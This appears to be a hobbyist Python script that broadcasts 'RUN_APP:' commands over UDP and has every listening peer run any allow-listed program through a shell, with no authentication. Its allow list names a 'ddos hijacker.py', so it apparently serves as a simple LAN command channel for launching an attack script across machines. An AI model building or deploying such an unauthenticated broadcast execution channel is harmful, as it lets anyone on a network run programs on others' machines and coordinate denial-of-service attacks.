import socket
import threading
import subprocess
import os

# 🔒 Allowed applications to run
ALLOWED_APPS = ["notepad.exe", "calculator.exe", "ddos hijacker.py"]

# 🌍 Network broadcast address (change this if necessary)
BROADCAST_IP = "255.255.255.255"
PORT = 6000  # Port used for communication

# 🚀 Function to run an application
def run_application(app_name):
    if app_name in ALLOWED_APPS:
        print(f"Running application: {app_name}")
        try:
            result = subprocess.run(app_name, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = result.stdout.decode('utf-8') if result.stdout else "No output"
            error = result.stderr.decode('utf-8') if result.stderr else "No errors"
            return f"✅ App ran successfully!\nOutput: {output}\nError: {error}"
        except Exception as e:
            return f"❌ Error running the app: {str(e)}"
    else:
        return f"⛔ App '{app_name}' is not allowed."

# 🎧 Peer server to listen for broadcasts
def start_peer_listener():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Use UDP for broadcasting
    server_socket.bind(("", PORT))  # Listen on all available interfaces
    print(f"🌍 Listening for broadcast messages on port {PORT}...")

    while True:
        data, addr = server_socket.recvfrom(1024)  # Receive data from any IP
        message = data.decode('utf-8')
        print(f"📩 Received message from {addr}: {message}")

        if message.startswith("RUN_APP:"):
            app_to_run = message[8:].strip()
            response = run_application(app_to_run)
            print(response)

# 📡 Function to broadcast a message to the entire network
def broadcast_command(command):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    try:
        client_socket.sendto(command.encode('utf-8'), (BROADCAST_IP, PORT))
        print(f"📡 Broadcasted: {command}")
    except Exception as e:
        print(f"❌ Broadcast error: {e}")
    finally:
        client_socket.close()

# 🎭 Start peer listener in a separate thread
listener_thread = threading.Thread(target=start_peer_listener, daemon=True)
listener_thread.start()

# 🎛️ User input loop for sending commands
while True:
    user_input = input("\nEnter command (RUN_APP:app_name or EXIT to quit): ").strip()
    
    if user_input.upper() == "EXIT":
        print("🚪 Exiting...")
        break
    elif user_input.startswith("RUN_APP:"):
        broadcast_command(user_input)
    else:
        print("⚠️ Invalid command format. Use 'RUN_APP:app_name'.")

